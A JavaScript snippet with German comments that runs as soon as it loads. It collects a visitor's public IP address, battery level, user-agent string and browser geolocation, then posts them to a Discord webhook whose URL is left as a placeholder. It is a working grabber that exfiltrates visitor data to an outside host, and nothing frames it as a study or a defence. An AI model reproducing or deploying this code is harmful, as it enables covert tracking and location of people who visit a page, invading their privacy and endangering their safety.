async function sendDataToDiscord() {
    try {
        // Hole die IPv4-Adresse
        const ipv4Response = await fetch('https://api.ipify.org?format=json');
        const ipv4Data = await ipv4Response.json();
        const ipv4Address = ipv4Data.ip;

        // Hole die IPv6-Adresse
        const ipv6Response = await fetch('https://api64.ipify.org?format=json');
        const ipv6Data = await ipv6Response.json();
        const ipv6Address = ipv6Data.ip;

        // Bevorzugt IPv4-Adresse
        const addressToSend = ipv4Address || ipv6Address;

        // Batteriestatus abfragen
        let batteryStatus = 'Batteriestatus konnte nicht abgefragt werden';
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            batteryStatus = `Ladezustand: ${Math.round(battery.level * 100)}%, ${battery.charging ? 'Lädt' : 'Nicht ladend'}`;
        }

        // Device-Informationen abfragen
        const deviceInfo = navigator.userAgent;

        // Geolocation abfragen
        let locationInfo = 'Geolocation konnte nicht abgefragt werden';
        if ('geolocation' in navigator) {
            locationInfo = new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude } = position.coords;
                        resolve(`Breitengrad: ${latitude}, Längengrad: ${longitude}`);
                    },
                    (error) => {
                        resolve(`Fehler beim Abrufen der Geolocation: ${error.message}`);
                    }
                );
            });
        }

        // Warten auf die Geolocation-Antwort
        locationInfo = await locationInfo;

        // Erstelle den Link für mehr Informationen
        const moreInfoLink = `https://whatismyipaddress.com/ip/${ipv4Address}`;

        // Erstelle die Nachricht
        const message = {
            content: `Die IP-Adresse ist: ${addressToSend}\n` +
                     `Batteriestatus: ${batteryStatus}\n` +
                     `Device-Informationen: ${deviceInfo}\n` +
                     `Geolocation: ${locationInfo}\n` +
                     `[Mehr Informationen](${moreInfoLink})`
        };

        // Discord Webhook URL hier einfügen
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/DEIN_WEBHOOK_URL';

        // Sende die Nachricht an Discord
        const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        });

        if (!discordResponse.ok) {
            throw new Error(`HTTP-Fehler! Status: ${discordResponse.status}`);
        }

        console.log('Nachricht erfolgreich an Discord gesendet!');
    } catch (error) {
        console.error('Fehler beim Senden der Nachricht:', error);
    }
}

// Aufrufen der Funktion
sendDataToDiscord();
